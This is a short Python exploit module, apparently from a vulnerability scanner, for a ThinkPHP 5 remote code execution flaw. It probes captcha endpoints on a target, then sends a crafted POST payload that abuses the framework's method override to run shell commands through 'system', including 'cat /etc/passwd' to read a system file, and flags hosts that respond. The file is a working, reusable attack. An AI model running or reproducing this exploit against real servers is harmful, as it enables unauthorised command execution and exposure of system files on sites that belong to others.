import re
import requests


class Exploit(object):
    """
    ref: https://xz.aliyun.com/t/3845
    """

    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537."
                      "36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36"
    }

    def get_path(self, host):
        test_paths = ["/public/index.php?s=captcha", "/index.php?s=captcha"]

        for test_path in test_paths:
            test_r = requests.get(host + test_path, headers=self.headers)
            if test_r.status_code == 200:
                target = host + test_path
                return target

    def attack(self, url):
        target = self.get_path(url)

        if not target:
            return False

        for command, flag in [('cat /etc/passwd', "/bin/bash"), ("echo heLl0wlrd", "heLl0wlrd")]:

            data = {
                "_method": "__construct",
                "filter[]": "system",
                "method": "get",
                "get[]": command
            }

            r = requests.post(target, data=data)

            m = re.search(r'<div class="echo">(.*?)</div>', r.text, re.S)

            if m and flag in m.group(1):
                return "Thinkphp5 RCE: {}".format(target)

